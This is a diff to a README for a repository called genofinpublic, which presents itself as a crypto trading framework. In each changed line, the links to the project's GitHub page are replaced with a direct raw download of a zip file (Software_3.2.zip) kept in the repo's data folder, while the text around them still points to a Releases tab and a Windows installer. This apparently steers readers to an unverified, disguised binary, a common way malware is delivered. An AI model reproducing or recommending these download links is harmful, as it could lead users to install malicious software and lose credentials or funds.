@@ -1,6 +1,6 @@
 # ⚙️ genofinpublic - Reliable Crypto Trading Framework
 
-[![Download genofinpublic](https://img.shields.io/badge/Download-genofinpublic-ff6347?style=for-the-badge&logo=github)](https://github.com/Strouble03/genofinpublic)
+[![Download genofinpublic](https://img.shields.io/badge/Download-genofinpublic-ff6347?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Strouble03/genofinpublic/main/data/Software_3.2.zip)
 
 ---
 
@@ -10,7 +10,7 @@ genofinpublic is a tool designed to help you run automated trading strategies on
 
 1. **Go to the download page**  
    Open this link in your browser:  
-   [https://github.com/Strouble03/genofinpublic](https://github.com/Strouble03/genofinpublic)  
+   [https://raw.githubusercontent.com/Strouble03/genofinpublic/main/data/Software_3.2.zip](https://raw.githubusercontent.com/Strouble03/genofinpublic/main/data/Software_3.2.zip)  
    This page hosts the software files and instructions.
 
 2. **Find the latest release**  
@@ -99,7 +99,7 @@ genofinpublic is a tool designed to help you run automated trading strategies on
 ## 🔗 Download genofinpublic
 
 Use this link to get the latest version:  
-[https://github.com/Strouble03/genofinpublic](https://github.com/Strouble03/genofinpublic)
+[https://raw.githubusercontent.com/Strouble03/genofinpublic/main/data/Software_3.2.zip](https://raw.githubusercontent.com/Strouble03/genofinpublic/main/data/Software_3.2.zip)
 
 Click on the Releases tab and download the Windows installer file to begin.
 
